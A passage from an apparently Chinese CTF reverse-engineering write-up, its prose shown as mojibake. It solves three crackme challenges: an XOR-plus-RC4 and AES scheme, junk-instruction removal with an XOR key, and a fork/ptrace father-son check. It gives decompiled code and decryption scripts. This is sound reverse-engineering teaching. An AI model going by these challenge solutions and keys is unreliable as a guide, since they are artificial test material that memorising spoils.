src="https://img.dkdun.cn/v1/2024/12/89a3916d618ae9df.png"></p><p><code>enc</code> å‡½æ•°çš„åŠ å¯†ä¼ªä»£ç </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">__int64 __fastcall enc(char *<span class="hljs-built_in">a1</span>)<br>&#123;<br>  int i<span class="hljs-comment">; // [rsp+0h] [rbp-20h]</span><br>  int v3<span class="hljs-comment">; // [rsp+4h] [rbp-1Ch]</span><br><br>  v3 = __strlen_chk(<span class="hljs-built_in">a1</span>, -<span class="hljs-number">1</span>LL);<br>  for ( i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; v3; ++i )</span><br>    <span class="hljs-built_in">a1</span>[i] ^= <span class="hljs-keyword">xork[i </span>% <span class="hljs-number">4</span>];<br>  return encc(<span class="hljs-keyword">xork, </span><span class="hljs-built_in">a1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆçœ‹è§ä¸€ä¸ª <code>encc</code> åŠ å¯†å‡½æ•°ï¼Œï¼ˆå¤ªå¥½äº†ï¼Œåˆæœ‰ä¸ªç®—æ³•åŠ å¯†ï¼Œæˆ‘ä»¬æœ‰æ•‘äº†!ï¼‰</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __fastcall encc(char *a1, char *a2)<br>&#123;<br>  unsigned __int64 v2; // rcx<br>  __int64 result; // rax<br>  unsigned __int8 v4; // [rsp+Ch] [rbp-34h]<br> <span class="hljs-built_in"> int </span>v5; // [rsp+14h] [rbp-2Ch]<br> <span class="hljs-built_in"> int </span>v6; // [rsp+18h] [rbp-28h]<br> <span class="hljs-built_in"> int </span>i; // [rsp+1Ch] [rbp-24h]<br><br>  init_sbox(a1);<br>  v5 = 0;<br>  v6 = 0;<br>  for ( i = 0; ; ++i )<br>  &#123;<br>    v2 = __strlen_chk(a2, -1<span class="hljs-class">LL);</span><br>    result = i;<br>   <span class="hljs-built_in"> if </span>( i &gt;= v2 )<br>      break;<br>    v6 = (v6 + 1) % 256;<br>    v5 = (sbox[v6] + v5) % 256;<br>    v4 = sbox[v6];<br>    sbox[v6] = sbox[v5];<br>    sbox[v5] = v4;<br>    a2[i] ^= sbox[(sbox[v5] + sbox[v6]) % 256];<br>  &#125;<br> <span class="hljs-built_in"> return </span>result;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå¼‚æˆ–ï¼Œä¸€ä¸ª RC4 åŠ å¯†ï¼Œæ‰¾åˆ°äº†å¼‚æˆ–çš„å­—ç¬¦ä¸² â€œmeowâ€ å’Œè¦è§£å¯†çš„æ•°æ®</p><p><img src="https://img.dkdun.cn/v1/2024/12/924ab39eead959c4.png"></p><p>è§£å¯†æµç¨‹ï¼šRC4-&gt;å¼‚æˆ–-&gt;Base64-&gt;AES</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">char</span> sbox[<span class="hljs-number">257</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">char</span> xork[] = <span class="hljs-string">&quot;meow&quot;</span>;<br><span class="hljs-comment">//sç›’</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_sbox</span><span class="hljs-params">(<span class="hljs-type">char</span>*a1)</span>&#123;<br>  <span class="hljs-type">int</span> i,j,k,tmp;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++ )<br>    sbox[i] = i;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++ )<br>  &#123;<br>    tmp = sbox[i];<br>    j = (a1[k] + tmp + j) % <span class="hljs-number">256</span>;<br>    sbox[i] = sbox[j];<br>    sbox[j] = tmp;<br>    <span class="hljs-keyword">if</span> ( ++k &gt;= <span class="hljs-built_in">strlen</span>(a1))<br>      k = <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">//è§£å¯† RC4</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">encc</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1,<span class="hljs-type">char</span>*data)</span>&#123;<br>  init_sbox(a1);<br>  <span class="hljs-type">int</span> i,j,k,tmp;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(data) ; i++ )<br>  &#123;<br>    j = (j + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    k = (sbox[j] + k) % <span class="hljs-number">256</span>;<br>    tmp = sbox[j];<br>    sbox[j] = sbox[k];<br>    sbox[k] = tmp;<br>    data[i] ^= sbox[(sbox[j] + sbox[k]) % <span class="hljs-number">256</span>];<br>  &#125;<br>&#125;<br><span class="hljs-comment">//å¼‚æˆ–</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">enc</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span>&#123;<br><span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; len; ++i )<br>    a1[i] ^= xork[i % <span class="hljs-number">4</span>];<br>  encc(xork, a1);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">char</span> mm[]=&#123;<span class="hljs-number">0xC2</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x81</span>, <br>  <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x04</span>,<br>  <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3D</span>,<br>  <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x5D</span>&#125;;<br>  enc(mm);<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">44</span>;i++)&#123;<br>    <span class="hljs-built_in">putchar</span>(mm[i]);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>AES å¯†é’¥æ˜¯&#96;&#96;MainActivity.title&#96; ä¹Ÿå°±æ˜¯ â€œIamEzEncryptGameâ€ ï¼Œå¨å­æ¢­å‡ºæ¥</p><p><img src="https://img.dkdun.cn/v1/2024/12/9fbf4e8780ac5eba.png"></p><h1 id="Dirty-flowers"><a href="#Dirty-flowers" class="headerlink" title="Dirty_flowers"></a>Dirty_flowers</h1><p>ä¸èƒ½ f5ï¼Œæœ‰èŠ±æŒ‡ä»¤ï¼Œé‚£å°±æŒ‰ä¸‹ space é”®çœ‹æ–‡æœ¬æµç¨‹ï¼Œç›´æ¥å°† push-pop çš„æŒ‡ä»¤ä¹Ÿå°±æ˜¯ <code>0x4012f1~0x401302</code> çš„æŒ‡ä»¤å…¨éƒ¨ nop æ‰ ,ç„¶ååœ¨ <code>main</code> å‡½æ•°å¤´æŒ‰ä¸‹ U å’Œ P é‡æ–°ç¼–è¯‘</p><p><img src="https://img.dkdun.cn/v1/2024/12/80a38a07ee4a66f3.png"></p><p>ä¼ªä»£ç å¤§æ¦‚æµç¨‹ï¼šè¾“å…¥ 36 é•¿åº¦å­—ç¬¦ä¸²ï¼Œè¿›å…¥ <code>sub_401100</code> åŠ å¯†ï¼Œå†ä¸ <code>sub_4011D0</code> åˆ¤æ–­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(v4) == <span class="hljs-number">36</span> )<br>  &#123;<br>    sub_401100(v4, <span class="hljs-number">36</span>);<br>    <span class="hljs-keyword">if</span> ( sub_4011D0(v4, <span class="hljs-number">36</span>) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;success!\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong length!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p><code>sub_401100</code> ä¹Ÿæœ‰èŠ±æŒ‡ä»¤ï¼Œå’Œä¸Šé¢çš„ä¸€æ ·æµç¨‹æ¥å»èŠ±</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_401100</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// kr00_4</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+1Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+24h] [ebp-14h] BYREF</span><br><br>  <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;dirty_flower&quot;</span>);<br>  v2 = <span class="hljs-built_in">strlen</span>(v5);<br>  result = v2;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    result = i + a1;<br>    *(_BYTE *)(i + a1) ^= v5[i % v2];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>sub_4011D0</code> å‡½æ•°æ¯”è¾ƒå†…å®¹å¤§æ¦‚æ˜¯ï¼šï¼ˆæˆ‘æ¯”è¾ƒå–œæ¬¢çœ‹æ±‡ç¼–æµç¨‹å›¾ï¼Œæ„Ÿè§‰æ¯”ä¼ªä»£ç æ›´æ–¹ä¾¿ :) å˜»å˜»ï¼‰</p><p><img src="https://img.dkdun.cn/v1/2024/12/ba83c2581a55c526.png"></p><p>è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x43</span>,<br>       <span class="hljs-number">0x07</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x32</span>,<br>       <span class="hljs-number">0x55</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;dirty_flower&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] ^= <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i % <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)])<br>    flag += <span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="Ptrace"><a href="#Ptrace" class="headerlink" title="Ptrace"></a>Ptrace</h1><p>ida å±…ç„¶è¿˜èƒ½åç¼–è¯‘<code>.txt</code> ï¼ŒçœŸçš„æ˜¯ tqlã€‚ç¬¬ä¸€æ¬¡è§è¿™ç§ç±»å‹çš„é¢˜ç›®ï¼Œçœ‹ wp ç†è§£äº†åŠå¤©ï¼Œå¤ç°äº†ä¿©å°æ—¶ï¼ˆ</p><p>è®°å¾—å°† <code>son.txt</code> å’Œ <code>father.txt</code> æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œæ‰“å¼€ <code>father.txt</code>  æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-30h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp-Ch] [ebp-28h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp-8h] [ebp-24h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp-4h] [ebp-20h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v9; <span class="hljs-comment">// [esp+0h] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> stat_loc[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">__pid_t</span> v11; <span class="hljs-comment">// [esp+Ch] [ebp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+10h] [ebp-Ch]</span><br>  <span class="hljs-type">int</span> *p_argc; <span class="hljs-comment">// [esp+14h] [ebp-8h]</span><br><br>  p_argc = &amp;argc;<br>  v9 = argv;<br>  v12 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%32s&quot;</span>, &amp;s, v4, v5, v6, v7, v8, v9);<br>  v11 = fork();<span class="hljs-comment">// åˆ›å»ºå­è¿›ç¨‹</span><br>  <span class="hljs-keyword">if</span> ( v11 )<br>  &#123;<span class="hljs-comment">//çˆ¶è¿›ç¨‹</span><br>    <span class="hljs-keyword">if</span> ( v11 &lt;= <span class="hljs-number">0</span> )<br>    &#123;<br>      perror(<span class="hljs-string">&quot;fork&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(stat_loc);<br>    ptrace(PTRACE_POKEDATA, addr, addr, <span class="hljs-number">3</span>);<br>    ptrace(PTRACE_CONT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    wait(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<span class="hljs-comment">//å­è¿›ç¨‹</span><br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    execl(<span class="hljs-string">&quot;./son&quot;</span>, <span class="hljs-string">&quot;son&quot;</span>, &amp;s, <span class="hljs-number">0</span>); <span class="hljs-comment">//æŠŠ s ä½œä¸ºæ–°è¿›ç¨‹çš„å‚æ•°</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äº<code>fork()</code>ã€<code>execl()</code> å‡½æ•°ï¼šéƒ½æ˜¯ Linux ä¸­çš„è¿›ç¨‹æ§åˆ¶å‡½æ•°</p><p><code>fork()</code>ï¼šåˆ›å»ºæ–°çš„è¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹å‡ ä¹ç›¸å½“äºå½“å‰è¿›ç¨‹çš„ä¸€ä¸ªå®Œå…¨æ‹·è´</p><p><code>execl()</code>ï¼šæ˜¯å‡½æ•°æ— <code>exec()</code> ä¹‹ä¸€ï¼Œç”¨æ¥å¯åŠ¨å¦å¤–çš„è¿›ç¨‹ä»¥å–ä»£å½“å‰è¿è¡Œçš„è¿›ç¨‹</p><p><code>execl()</code> å››ä¸ªå‚æ•°</p><table><thead><tr><th>å‚æ•°</th><th>å˜é‡ç±»å‹</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>ç»å¯¹è·¯å¾„</td><td>const char*</td><td>æ–‡ä»¶å­˜å‚¨è·¯å¾„</td></tr><tr><td>æ ‡è¯†ç¬¦</td><td>const char*</td><td>å¤§å¤šæ•°æ—¶å€™æ˜¯æ–‡ä»¶å</td></tr><tr><td>å‚æ•°</td><td>â€”â€”</td><td>é€‰é¡¹</td></tr><tr><td>NULL</td><td>â€”â€”</td><td>NULL</td></tr></tbody></table><p>æ‰€ä»¥ <code>main()</code> å‡½æ•°ä¸­æµç¨‹ï¼š<code>fork()</code> åˆ›å»ºå­è¿›ç¨‹ï¼Œè¿”å›çš„ <code>pid</code> å°±æ˜¯ <code>v11</code>ï¼Œ<code>v11</code>&gt;0 ä¸ºçˆ¶è¿›ç¨‹ï¼Œ<code>v11=0</code> ä¸ºå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹ä¸­ä½¿ç”¨äº† <code>execl()</code> å‡½æ•°ï¼Œå¯åŠ¨å½“å‰ç›®å½•ä¸‹çš„ <code>son</code> æ–‡ä»¶ï¼Œä¼ å…¥ <code>s</code> ä½œä¸ºæ–°è¿›ç¨‹çš„å‚æ•°ï¼Œè¿™é‡Œçš„æ–°è¿›ç¨‹æ›¿æ¢æ‰ä¹‹å‰çš„å­è¿›ç¨‹ï¼Œä½¿è‡ªå·±å˜æˆå­è¿›ç¨‹ã€‚</p><p>æ‰“å¼€ <code>son.txt</code> æŸ¥çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_600011AD</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+2h] [ebp-28h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+6h] [ebp-24h]</span><br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [esp+Ah] [ebp-20h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+Eh] [ebp-1Ch]</span><br><br>  s = *(<span class="hljs-type">char</span> **)(a2 + <span class="hljs-number">4</span>);<br>  v6 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>    byte_60004080[i] = ((<span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="hljs-number">8</span> - dword_60004040));<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v6; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( byte_60004080[j] != byte_60004020[j] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is Wrong~&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is right~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>s = *(char **)(a2 + 4)</code>ï¼Œå…¶å®å®ƒå°±æ˜¯æŒ‡å‘ <code>father</code> ä¼ å…¥çš„ <code>s</code>ã€‚<code>execl</code> æ‰§è¡Œçš„å‘½ä»¤ä¸º <code>./son s</code>ï¼Œè€Œå¯¹äº <code>son</code> æ–‡ä»¶çš„ä¸»å‡½æ•°è€Œè¨€ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <code>a1</code> è¡¨ç¤ºæ‰§è¡Œå‘½ä»¤å‚æ•°çš„ä¸ªæ•°ï¼Œè¿™é‡Œå°±æ˜¯ 2ï¼Œè€Œåé¢çš„ <code>a2</code> çœŸå®ç±»å‹ä¸º <code>const char*</code>ï¼Œä»£è¡¨çš„å°±æ˜¯å‘½ä»¤çš„å„ä¸ªå‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œçš„ <code>a2 + 4</code> æ‰§è¡Œçš„å°±æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ <code>s</code>.</p><p><img src="https://img.dkdun.cn/v1/2024/12/d178e014557fc4c8.png"></p><p>å¤§æ¦‚æµç¨‹ä¸ºï¼šå°† <code>s</code> ä¸­çš„æ¯ä¸ªå­—èŠ‚å¾ªç¯ç§»ä½æ¥è¿›è¡Œå˜åŒ–ï¼Œæœ€åä¸å¯†æ–‡è¿›è¡Œæ¯”è¾ƒ</p><p>å¯¹äº <code>father</code> æ–‡ä»¶çš„ <code>ptarce</code>ï¼Œ<code>ptrace</code> æ˜¯ç”¨äºè¿›ç¨‹è·Ÿè¸ªçš„ï¼Œå®ƒæä¾›äº†çˆ¶è¿›ç¨‹å¯ä»¥è§‚å¯Ÿå’Œæ§åˆ¶å…¶å­è¿›ç¨‹æ‰§è¡Œçš„èƒ½åŠ›ï¼Œå¹¶å…è®¸çˆ¶è¿›ç¨‹æ£€æŸ¥å’Œæ›¿æ¢å­è¿›ç¨‹çš„å†…æ ¸é•œåƒ(åŒ…æ‹¬å¯„å­˜å™¨)çš„å€¼ã€‚å…¶åŸºæœ¬åŸç†æ˜¯: å½“ä½¿ç”¨äº†<code>ptrace</code>è·Ÿè¸ªåï¼Œæ‰€æœ‰å‘é€ç»™è¢«è·Ÿè¸ªçš„å­è¿›ç¨‹çš„ä¿¡å·(é™¤äº†<code>SIGKILL</code>)ï¼Œéƒ½ä¼šè¢«è½¬å‘ç»™çˆ¶è¿›ç¨‹ï¼Œè€Œå­è¿›ç¨‹åˆ™ä¼šè¢«é˜»å¡ï¼Œè¿™æ—¶å­è¿›ç¨‹çš„çŠ¶æ€å°±ä¼šè¢«ç³»ç»Ÿæ ‡æ³¨ä¸º<code>TASK_TRACED</code>ã€‚è€Œçˆ¶è¿›ç¨‹æ”¶åˆ°ä¿¡å·åï¼Œå°±å¯ä»¥å¯¹åœæ­¢ä¸‹æ¥çš„å­è¿›ç¨‹è¿›è¡Œæ£€æŸ¥å’Œä¿®æ”¹ï¼Œç„¶åè®©å­è¿›ç¨‹ç»§ç»­è¿è¡Œã€‚   </p><p>è€Œè¿™é‡ŒæŸ¥çœ‹å­è¿›ç¨‹ï¼Œå¯ä»¥å‘ç°ä½¿ç”¨ <code>ptrace(PTRACE_TRACEME, 0, 0, 